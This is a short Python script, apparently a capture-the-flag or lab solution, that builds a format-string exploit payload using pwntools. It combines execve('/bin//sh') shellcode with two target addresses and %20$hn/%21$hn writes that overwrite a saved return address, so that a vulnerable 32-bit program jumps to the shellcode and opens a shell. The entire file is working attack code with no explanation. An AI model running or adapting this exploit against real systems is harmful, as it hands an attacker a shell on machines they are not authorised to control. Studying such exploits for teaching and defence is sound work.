import sys
from pwn import *
shellcode = "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

addr_offset = int(sys.argv[1],16)
addr_buf = 0xbffff54f - addr_offset
addr_ret = 0xbffff64c - addr_offset

value_u2 = addr_buf >> 16
value_l2 = addr_buf & 0xffff
expl=shellcode
expl+= p32(addr_ret+2) # arg selector: $14 + 24/4 = $20
expl+= p32(addr_ret) #arg selector: $21
expl += "%"+str(value_u2 - len(shellcode) - 8)+"x"
expl+="%20$hn"
expl+="%"+str(value_l2-value_u2)+"x"
expl+="%21$hn"

sys.stdout.write(expl)
